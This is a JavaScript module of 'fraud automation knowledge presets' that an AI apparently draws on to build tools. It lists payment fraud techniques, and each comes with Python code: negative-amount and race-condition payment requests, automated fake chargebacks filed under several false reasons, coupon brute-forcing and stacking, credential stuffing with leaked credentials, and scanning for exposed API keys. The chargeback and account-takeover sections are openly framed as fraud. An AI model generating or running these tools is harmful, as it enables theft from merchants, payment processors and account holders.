// Fraud Automation Knowledge Presets
// This file contains **knowledge presets** for fraud automation techniques.
// The AI uses this to **generate tools dynamically** when needed.

export const FRAUD_TECHNIQUES = {
  transaction_testing: {
    description: "Test for weak validation in payment processing systems",
    methods: [
      "Amount Manipulation: Change amount to negative or extremely high values",
      "Currency Switching: Change currency to exploit exchange rate discrepancies",
      "Duplicate Transactions: Replay the same transaction ID multiple times",
      "Race Conditions: Send multiple requests simultaneously to exploit timing issues",
      "Partial Refunds: Request refunds for partial amounts to bypass detection",
    ],
    toolsNeeded: ["cURL", "Burp Suite", "Custom Python scripts"],
    exampleCode: `
import requests
import threading

def test_amount_manipulation(api_url, original_amount):
    test_amounts = [
        -1,  # Negative amount
        0.01,  # Very small amount
        999999,  # Extremely large amount
        original_amount * 100,  # 100x original
    ]
    
    for amount in test_amounts:
        try:
            response = requests.post(api_url, json={
                'amount': amount,
                'currency': 'USD'
            }, timeout=5)
            if response.status_code == 200:
                print(f"[+] Amount manipulation successful with: {amount}")
                return amount
        except:
            pass
    return None

def test_race_condition(api_url, payload, times=10):
    def send_request():
        try:
            response = requests.post(api_url, json=payload, timeout=5)
            if response.status_code == 200:
                print(f"[+] Race condition request successful")
        except:
            pass
    
    threads = []
    for _ in range(times):
        t = threading.Thread(target=send_request)
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()
`,
  },
  
  chargeback_abuse: {
    description: "Exploit refund and chargeback systems",
    methods: [
      "Fake Disputes: Automate chargeback requests for legitimate transactions",
      "Double Refunds: Request refunds twice for the same transaction",
      "Item Not Received: Claim items were never delivered",
      "Unauthorized Transaction: Claim the transaction was fraudulent",
      "Service Not Provided: Claim the service was not rendered",
    ],
    toolsNeeded: ["Automated dispute scripts", "API abuse tools"],
    exampleCode: `
import requests
import time

def automate_chargebacks(api_url, transaction_ids):
    reasons = [
        "item_not_received",
        "unauthorized_transaction",
        "service_not_provided",
        "not_as_described",
    ]
    
    for tx_id in transaction_ids:
        for reason in reasons:
            try:
                response = requests.post(f"{api_url}/{tx_id}/dispute", json={
                    'reason': reason,
                    'amount': 'full'
                }, timeout=5)
                if response.status_code == 200:
                    print(f"[+] Chargeback successful for {tx_id} with reason: {reason}")
                    time.sleep(1)  # Avoid rate limiting
            except:
                pass
`,
  },
  
  coupon_abuse: {
    description: "Exploit discount and coupon systems",
    methods: [
      "Coupon Stacking: Apply multiple coupons to a single order",
      "Reuse Coupons: Use the same coupon code repeatedly",
      "Brute-Force Coupons: Test random coupon codes",
      "Coupon Generation: Predict valid coupon codes based on patterns",
      "API Tampering: Modify coupon validation logic",
    ],
    toolsNeeded: ["Python brute-forcer", "API fuzzer"],
    exampleCode: `
import requests
import itertools

def brute_force_coupons(api_url, prefix='', length=8):
    chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    
    for code in itertools.product(chars, repeat=length):
        code_str = prefix + ''.join(code)
        try:
            response = requests.post(api_url, json={
                'coupon_code': code_str
            }, timeout=5)
            if response.status_code == 200 and 'discount' in response.text:
                print(f"[+] Valid coupon found: {code_str}")
                return code_str
        except:
            pass
    return None

def test_coupon_stacking(api_url, coupons):
    for i in range(1, len(coupons) + 1):
        try:
            response = requests.post(api_url, json={
                'coupons': coupons[:i]
            }, timeout=5)
            if response.status_code == 200:
                print(f"[+] Successfully stacked {i} coupons")
        except:
            pass
`,
  },
  
  account_takeover: {
    description: "Take over payment accounts for fraudulent transactions",
    methods: [
      "Credential Stuffing: Use leaked credentials to access accounts",
      "Session Hijacking: Steal session tokens to impersonate users",
      "API Key Theft: Extract API keys from client-side code",
      "OAuth Exploits: Exploit weak OAuth implementations",
      "Password Reset: Exploit weak password reset functionality",
    ],
    toolsNeeded: ["Credential databases", "Session hijacking tools", "API testing tools"],
    exampleCode: `
import requests

def test_credential_stuffing(api_url, credentials):
    for cred in credentials:
        try:
            response = requests.post(f"{api_url}/login", json={
                'email': cred['email'],
                'password': cred['password']
            }, timeout=5)
            if response.status_code == 200:
                print(f"[+] Successful login with: {cred['email']}")
                return cred
        except:
            pass
    return None

def extract_api_keys(url):
    try:
        response = requests.get(url, timeout=10)
        # Look for API keys in JavaScript files
        if 'api_key' in response.text or 'API_KEY' in response.text:
            print(f"[+] Potential API key found at: {url}")
            return True
    except:
        pass
    return False
`,
  },
};
